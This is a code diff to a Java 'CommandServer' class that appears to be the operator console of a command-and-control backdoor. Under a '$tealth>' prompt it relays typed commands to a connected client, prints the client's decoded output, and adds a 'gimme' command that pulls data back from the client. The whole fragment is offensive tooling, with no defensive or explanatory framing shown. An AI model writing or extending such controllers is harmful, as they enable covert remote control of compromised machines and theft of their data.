@@ -26,22 +26,20 @@ public class CommandServer implements Runnable{
 			try {
 				System.out.println("[-] HTTP Command Server: Exchange Begins");
 				Socket connection=server.accept();
-				sendAll(connection,"Server Is Ready!");
-				System.out.println("[-] HTTP Command Server: Server Hello Sent");
-				String clientResponseRaw = readAll(connection);
-				System.out.println("[-] HTTP Command Server: Client Response Recieved");
-				
-				String clientResponseDecoded = decodeResponse(clientResponseRaw);
-				System.out.println("[>] HTTP Command Server: "+clientResponseDecoded);
 				while(true) {
 					System.out.print("$tealth>");
 					String command = stdin.nextLine();
-					if(ci.checkCommand(command)) {
+					if(command.equals("")){
+						continue;
+					}
+					else if(command.startsWith("gimme")){
+						sendAll(connection,command);
+						System.out.println(decodeResponse(readAll(connection)));
+					}
+					else if(ci.checkCommand(command)) {
 						ci.runCommand(command);
 					}else {
 						sendAll(connection, command);
-						String commandOutput = decodeResponse(readAll(connection));
-						System.out.println(commandOutput);
 					}
 				}
 			} catch (IOException e) {
